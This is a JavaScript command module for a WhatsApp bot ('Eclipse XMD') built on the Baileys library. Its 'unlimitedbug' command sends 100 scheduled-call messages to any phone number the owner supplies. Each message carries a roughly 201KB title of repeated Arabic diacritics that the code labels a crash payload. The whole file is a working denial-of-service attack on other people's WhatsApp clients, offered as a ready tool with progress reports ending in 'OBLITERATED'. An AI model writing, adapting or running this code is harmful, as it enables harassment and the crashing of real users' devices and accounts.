import config from '../../config.js';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const OWNER_NUMBER = config.ownerNumber.replace(/^\+/, '');
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

const normalizeNumber = (number) => number.replace(/[^0-9]/g, '');
const isValidPhoneNumber = (number) => {
  const cleaned = normalizeNumber(number);
  return cleaned.length >= 10 && cleaned.length <= 15;
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const XEONTEXT3 = `𝐄𝐂𝐋𝐈𝐏𝐒𝐄 𝐗𝐌𝐃 ☠️̷⃨⃛꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨ` + "ۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗ".repeat(12000);

export default {
  name: 'unlimitedbug',
  description: '🔥 UNLIMITED: Continuous bug attack with Arabic diacritics payload',
  category: 'Bug/Crash',
  usage: `${config.prefix}unlimitedbug <number>`,
  
  async execute(msg, { sock, args }) {
    const from = msg.key.remoteJid;
    const senderJid = msg.key.participant || msg.key.remoteJid;
    const senderNumber = senderJid.split('@')[0];

    console.log(`[UNLIMITEDBUG] Command triggered by ${senderJid}`);

    const normalizedSender = normalizeNumber(senderNumber);
    const normalizedOwner = normalizeNumber(OWNER_NUMBER);
    const isOwner = senderJid === OWNER_JID || normalizedSender === normalizedOwner;

    if (!isOwner) {
      await sock.sendMessage(from, {
        text: `🚫 *ACCESS DENIED* - Owner-only command`
      }, { quoted: msg });
      return;
    }

    if (!args[0]) {
      await sock.sendMessage(from, {
        text: `🔥 *UNLIMITED BUG ATTACK*\n\n📋 Usage: ${config.prefix}unlimitedbug <number>\n📝 Example: ${config.prefix}unlimitedbug 1234567890\n\n⚠️ WARNING:\n• Sends 100 scheduled call crashes\n• Uses Arabic diacritics (201KB payload)\n• Very high ban risk\n• Takes ~5 minutes to complete`
      }, { quoted: msg });
      return;
    }

    let client = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || args[0];
    let clientNumber = client.includes('@s.whatsapp.net') ? client.split('@')[0] : normalizeNumber(client);

    if (!isValidPhoneNumber(clientNumber)) {
      await sock.sendMessage(from, {
        text: `❌ Invalid number (must be 10-15 digits)`
      }, { quoted: msg });
      return;
    }

    const targetJid = client.includes('@s.whatsapp.net') ? client : `${clientNumber}@s.whatsapp.net`;

    try {
      await sock.sendMessage(from, { react: { text: '🔥', key: msg.key } });

      await sock.sendMessage(from, {
        text: `🔥 *UNLIMITED BUG INITIATED*\n\n🎯 Target: +${clientNumber}\n💣 Type: Unlimited Scheduled Call\n📦 Payload: 201KB Arabic Diacritics\n⏳ Sending 100 payloads...`
      }, { quoted: msg });

      const amount = 100;
      let successCount = 0;

      for (let i = 0; i < amount; i++) {
        try {
          const scheduledCallCreationMessage = generateWAMessageFromContent(from, {
            scheduledCallCreationMessage: {
              callType: "2",
              scheduledTimestampMs: Date.now() + 86400000,
              title: XEONTEXT3
            }
          }, { userJid: from, quoted: msg });

          await sock.relayMessage(targetJid, scheduledCallCreationMessage.message, { 
            messageId: scheduledCallCreationMessage.key.id 
          });
          
          successCount++;
          await sleep(3000);
          
          if ((i + 1) % 20 === 0) {
            await sock.sendMessage(from, {
              text: `⏳ Progress: ${i + 1}/${amount} sent...`
            }, { quoted: msg });
          }
        } catch (err) {
          console.log(`[UNLIMITEDBUG] Error on payload ${i + 1}: ${err.message}`);
        }
      }

      await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });

      await sock.sendMessage(from, {
        text: `✅ *UNLIMITED BUG COMPLETED*\n\n🎯 Target: +${clientNumber}\n💣 Successful: ${successCount}/${amount}\n📦 Total Data: ~20MB\n📊 Status: OBLITERATED\n⚠️ Wait 10+ minutes before next use\n\n🔥 ECLIPSE XMD - UNLIMITED MODE`
      }, { quoted: msg });

      console.log(`[UNLIMITEDBUG] Attack completed: ${successCount}/${amount} on ${clientNumber}`);
    } catch (e) {
      console.log(`[UNLIMITEDBUG] Fatal error: ${e.message}`);
      await sock.sendMessage(from, {
        text: `❌ *ATTACK FAILED*\n\nTarget: +${clientNumber}\nError: ${e.message}`
      }, { quoted: msg });
    }
  }
};
